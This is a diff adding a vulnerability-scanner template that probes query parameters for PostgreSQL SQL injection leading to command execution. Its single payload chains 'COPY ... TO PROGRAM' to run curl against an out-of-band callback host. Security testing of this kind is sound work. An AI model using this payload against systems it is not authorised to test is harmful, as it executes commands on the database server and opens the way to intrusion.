@@ -1,0 +1,30 @@
+id: ai-fuzz-copy-to-program-oob
+
+info:
+  name: PostgreSQL COPY TO PROGRAM OOB
+  author: openai
+  severity: critical
+  tags: postgres,rce,oob,dast
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    payloads:
+      copyprog:
+        - "1; COPY (SELECT 'test') TO PROGRAM 'curl http://{{interactsh-url}}'--"
+        
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{copyprog}}"
+
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - http
